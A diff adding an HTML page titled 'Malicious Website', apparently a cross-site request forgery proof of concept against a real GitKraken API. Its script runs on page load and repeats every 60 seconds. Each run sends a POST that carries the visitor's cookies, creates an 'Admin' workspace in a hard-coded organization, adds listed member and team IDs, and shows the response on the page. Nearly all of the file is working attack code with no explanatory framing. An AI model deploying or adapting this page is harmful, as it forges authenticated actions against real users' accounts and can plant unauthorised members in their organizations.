@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Website</title>
+</head>
+<body>
+    <h1>Malicious Website</h1>
+    <button id="sendRequest">Send Request to Your Website</button>
+
+    <h2>Response Data from Your Website:</h2>
+    <pre id="responseData"></pre>  <!-- Where we show the data -->
+
+    <h3>Next Refresh in: <span id="timer">60</span> seconds</h3> <!-- Timer countdown -->
+
+    <script>
+        // Function to send the request and get the data
+        function sendRequest() {
+            fetch('https://gitkraken.dev/api/organizations/68d29998bced52677d0f6e64/workspaces', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    azureOrganizationId: "",
+                    name: "Admin",
+                    description: "SORSORAR KING",
+                    members: [
+                        {"id": "27be5549-c311-41de-8702-eb1ba1261e72"},
+                        {"id": "c17a1ae9-985b-405b-92b6-9d635fc92d35"}
+                    ],
+                    teams: ["68daa3868bea5b78f08d4e92"],
+                    repositories: [],
+                    provider: "GITHUB",
+                    hostUrl: ""
+                }),
+                credentials: 'include'  // Sends cookies if needed
+            })
+            .then(response => response.json())  // Parse JSON response from the server
+            .then(data => {
+                // If data is received, display it on the page
+                console.log('Response from your website:', data);
+                document.getElementById('responseData').textContent = JSON.stringify(data, null, 2);  // Show it on the page
+            })
+            .catch(error => {
+                console.error('Error:', error);  // If an error occurs, log it
+            });
+        }
+
+        // Function to start the timer and update every second
+        function startTimer() {
+            let countdown = 60; // Start countdown at 60 seconds
+            const timerElement = document.getElementById('timer');
+            
+            // Update the timer every second
+            const interval = setInterval(() => {
+                timerElement.textContent = countdown;
+                countdown--;
+                
+                // When the timer reaches zero, send the request again and reset the timer
+                if (countdown < 0) {
+                    sendRequest();  // Send the request to your website
+                    countdown = 60; // Reset the timer to 60 seconds
+                }
+            }, 1000); // Update every 1000ms (1 second)
+        }
+
+        // Initial request when the page loads
+        sendRequest();
+        
+        // Start the timer as soon as the page is loaded
+        startTimer();
+        
+        // If you want to send a request manually too, uncomment the next line:
+        // document.getElementById('sendRequest').addEventListener('click', sendRequest);
+    </script>
+</body>
+</html>
